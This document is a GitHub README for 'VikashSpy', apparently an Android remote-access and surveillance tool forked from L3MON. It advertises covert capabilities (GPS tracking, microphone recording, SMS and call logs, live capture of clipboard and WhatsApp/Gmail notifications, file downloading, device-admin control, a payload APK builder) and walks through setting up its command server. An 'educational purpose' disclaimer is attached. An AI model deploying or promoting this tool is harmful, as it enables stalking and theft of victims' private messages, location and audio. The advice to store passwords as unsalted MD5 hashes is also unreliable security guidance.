<p align="center">
<img src="https://github.com/vikashmobileclinic/VikashSpy/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based Android Monitoring Tool, powered by NodeJS
</p>

## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Device Admin
- Built In APK Builder

## Installation on VPS or Server

## Prerequisites 
 - Java Runtime Environment 9 or above
 - NodeJs 
 - A Server  
 
Installation on VPS or Server
Video Tutorial for VPS or Server Click Here

Connect to your server via SSH

Install JRE 9+

Debian, Ubuntu, Etc
sudo apt install openjdk-11-jre-headless
Fedora, Oracle, Red Hat, etc
sudo yum install java-11-openjdk-devel"
Windows
click HERE for downloads
Install NodeJS Instructions Here (If you can't figure this out, you shouldn't really be using this)

install PM2

sudo npm install pm2 -g
Clone this repository

git clone https://github.com/vikashmobileclinic/VikashSpy.git
Now change to the server directory and run these commands

npm install <- install dependencies
pm2 start index.js <-- start the script
pm2 startup <- to run VikashSpy on startup
Default Username : admin & Default Password : password

Change the Username & Password

Stop VikashSPY pm2 stop index
Open maindb.json in a text editor
under admin
set the username as plain text
set the password as a LOWERCASE MD5 hash
save the file
run pm2 restart all
in your browser navigate to http://<SERVER IP or URL>:22533
 
 Video Tutorial for VPS or Server [Click Here](https://youtu.be/F0K1IXvdEJk)

It's recommended to run VikashSpy behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Buy us a Coffee
   Bitcoin :  
   
   Paypal :  



## Disclaimer
<b>VikashSpy Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
VikashSpy is built for Educational Purpose. Use at your own Risk.</b>

<br>
<p align="center">Made with ❤️ By VikashSpy</a></p>

## Credits

<b> Credits to <a href="https://github.com/D3VL">D3VL</a> for the original code base this repository is based on at <a href="https://github.com/D3VL/L3MON">L3MON</a>
